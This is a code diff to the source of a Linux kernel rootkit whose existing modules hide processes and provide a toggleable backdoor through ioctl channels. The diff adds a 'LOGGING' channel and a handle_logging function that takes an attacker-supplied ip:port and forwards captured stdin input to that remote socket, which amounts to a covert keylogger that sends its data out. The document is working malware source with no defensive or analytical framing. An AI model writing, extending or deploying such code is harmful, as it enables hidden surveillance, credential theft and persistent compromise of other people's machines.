@@ -1,3 +1,4 @@
+#include <linux/string.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/uaccess.h>
@@ -11,6 +12,7 @@
 #include "openhide.h"
 #include "backdoor.h"
 #include "pidhide.h"
+#include "inputlog.h"
 #include "ioctl.h"
 #include "rootkit.h"
 
@@ -30,6 +32,7 @@ report_channels(void)
     DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_PIDHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
     DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
+    DEBUG_NOTICE("%-24s %#10lx\n", "LOGGING",  G7_LOGGING);
     DEBUG_NOTICE("-----------------------------------\n");
 }
 
@@ -44,6 +47,7 @@ detect_channel(unsigned cmd)
     case G7_PIDHIDE:  return (channel_t){ "HIDEPID",  handle_pidhide  };
     case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
     case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
+    case G7_LOGGING:  return (channel_t){ "LOGGING",  handle_logging  };
     }
 
     return (channel_t){ "unknown", NULL };
@@ -224,6 +228,36 @@ handle_togglebd(unsigned long arg)
     }
 
     DEBUG_NOTICE("[g7] backdoor %s\n", msg);
+
+    return 0;
+}
+
+int
+handle_logging(unsigned long arg)
+{
+    char buf[BUFLEN];
+    const char *sarg = (const char *)arg;
+
+    if (!sarg) {
+        unlog_input();
+        rootkit.logging_input = 0;
+
+        DEBUG_NOTICE("[g7] inputlogging off\n");
+    } else if (!copy_from_user(buf, sarg, BUFLEN) && strstr(buf, ":")) {
+        if (!rootkit.logging_input) {
+            DEBUG_NOTICE("[g7] inputlogging on\n");
+        } else
+            unlog_input();
+
+        char *port = buf;
+        char *ip = strsep(&port, ":");
+
+        log_input(ip, port);
+        rootkit.logging_input = 1;
+
+        DEBUG_INFO("[g7] forwarding stdin to socket %s:%s\n", ip, port);
+    } else
+        return -ENOTTY;
 
     return 0;
 }
